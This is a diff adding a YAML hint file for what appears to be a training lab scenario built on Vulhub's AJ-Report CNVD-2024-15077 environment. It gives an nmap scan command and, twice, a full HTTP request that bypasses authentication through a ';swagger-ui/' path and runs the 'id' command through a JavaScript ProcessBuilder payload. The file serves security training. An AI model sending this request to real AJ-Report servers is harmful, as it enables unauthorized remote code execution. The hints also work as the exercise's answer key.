@@ -1,0 +1,89 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: aj-report/CNVD-2024-15077
+hint_levels:
+  low:
+  - Inspect the aj-report service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 5005,9095. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 5005,9095 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 9095/tcp → container 9095/tcp; web: 5005/tcp → container
+    5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:9095`.'
+  high:
+  - 'Vulnerability: AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077).'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    To exploit the issue by following request:
+
+    ```
+    POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+    Host: {{NODE_IP}}:9095
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: application/json;charset=UTF-8
+    Connection: close
+
+    {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+    ```
+
+    As you can see, `id` command is executed successfully:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/aj-report/CNVD-2024-15077/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/aj-report/CNVD-2024-15077/README.md'
+  - |-
+    Additional public references:
+    - https://xz.aliyun.com/t/14460
+    - https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+access_instructions:
+  title: AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 5005,9095. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 5005,9095 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 9095/tcp → container 9095/tcp; web: 5005/tcp → container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:9095`.
+  - title: Exploit
+    instructions: |-
+      To exploit the issue by following request:
+
+      ```
+      POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+      Host: {{NODE_IP}}:9095
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: zh-CN,zh;q=0.9
+      Content-Type: application/json;charset=UTF-8
+      Connection: close
+
+      {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+      ```
+
+      As you can see, `id` command is executed successfully:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/aj-report/CNVD-2024-15077/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/aj-report/CNVD-2024-15077/README.md
+  readme_sha256: 8485cf16e33d37ec524c70aabf322e3335172055c68d003932c11da0a3d42fd0
+  compose_sha256: a8e3515b02493a32389c434b1c072f91c2e10a0cdaf32904d22a132df6333d60
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
